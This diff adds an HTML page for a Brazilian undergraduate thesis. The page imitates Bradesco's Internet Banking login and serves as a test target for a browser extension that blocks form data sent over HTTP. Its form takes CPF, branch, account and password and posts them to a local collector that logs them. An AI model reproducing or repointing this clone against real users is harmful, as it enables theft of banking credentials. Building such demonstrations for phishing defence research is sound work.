@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<!--
+  § TCC — Cenário 2 (Auditoria de Formulários, Seção 4.5) e Modelo de Ameaça.
+  Página de SIMULAÇÃO ACADÊMICA que imita a tela de acesso do Bradesco.
+  Objetivo: demonstrar o roubo de credenciais por phishing e o bloqueio da
+  extensão. O formulário envia os dados para um destino HTTP (coletor local),
+  que é exatamente o que a extensão audita e bloqueia.
+  NÃO é um site oficial. Uso restrito à demonstração do próprio autor.
+-->
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Bradesco | Internet Banking</title>
+  <link rel="stylesheet" href="estilo.css" />
+</head>
+<body>
+  <!-- § Cabeçalho imitando a identidade visual do banco (apenas texto/CSS). -->
+  <header class="topo">
+    <div class="topo__conteudo">
+      <span class="logo">Bradesco</span>
+      <nav class="topo__nav">
+        <a href="#">Pessoa Física</a>
+        <a href="#">Empresas</a>
+        <a href="#">Atendimento</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="miolo">
+    <section class="cartao">
+      <h1 class="cartao__titulo">Acesso ao Internet Banking</h1>
+      <p class="cartao__ajuda">Informe seus dados para entrar na sua conta.</p>
+
+      <!--
+        § O destino é HTTP (coletor local). A extensão, ao auditar o envio,
+        detecta o protocolo inseguro e bloqueia (Cenário 2). Sem a extensão,
+        o POST chega ao coletor, que grava as credenciais em arquivo.
+      -->
+      <form class="formulario" action="http://localhost:9000/coletar" method="POST">
+        <label for="cpf">CPF</label>
+        <input type="text" id="cpf" name="cpf" inputmode="numeric" placeholder="000.000.000-00" autocomplete="off" required />
+
+        <div class="linha">
+          <div class="campo">
+            <label for="agencia">Agência</label>
+            <input type="text" id="agencia" name="agencia" inputmode="numeric" placeholder="0000" autocomplete="off" required />
+          </div>
+          <div class="campo">
+            <label for="conta">Conta (com dígito)</label>
+            <input type="text" id="conta" name="conta" inputmode="numeric" placeholder="00000000-0" autocomplete="off" required />
+          </div>
+        </div>
+
+        <label for="senha">Senha</label>
+        <input type="password" id="senha" name="senha" placeholder="Sua senha" autocomplete="off" required />
+
+        <button type="submit" class="botao">Entrar</button>
+      </form>
+
+      <ul class="cartao__links">
+        <li><a href="#">Esqueci minha senha</a></li>
+        <li><a href="#">Primeiro acesso</a></li>
+      </ul>
+    </section>
+  </main>
+
+  <!-- § Aviso de simulação acadêmica: deixa claro que não é site oficial. -->
+  <footer class="rodape">
+    Página de simulação acadêmica — Trabalho de Conclusão de Curso, Universidade
+    Tuiuti do Paraná. Não é um site oficial do Bradesco. Os dados inseridos são
+    usados apenas pelo próprio autor, para demonstrar a prevenção de phishing.
+  </footer>
+</body>
+</html>
